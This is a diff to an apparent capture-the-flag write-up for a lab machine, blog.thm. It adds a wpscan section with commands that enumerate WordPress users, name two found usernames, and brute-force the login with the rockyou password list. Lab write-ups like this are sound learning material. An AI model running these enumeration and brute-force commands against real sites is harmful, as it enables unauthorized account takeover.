@@ -51,4 +51,13 @@ Nmap done: 1 IP address (1 host up) scanned in 56.38 seconds
 
 ---
 
-### feroxbuster
+### wpscan
+
+was able to enumerate users with this command:
+`wpscan --url blog.thm --enumerate u`
+
+we have two usernames: `kwheel` and `bjoel`
+
+we can brute force the login with this:
+`wpscan --url blog.thm -U kwheel,bjoel --passwords /usr/share/wordlists/rockyou.txt`
+
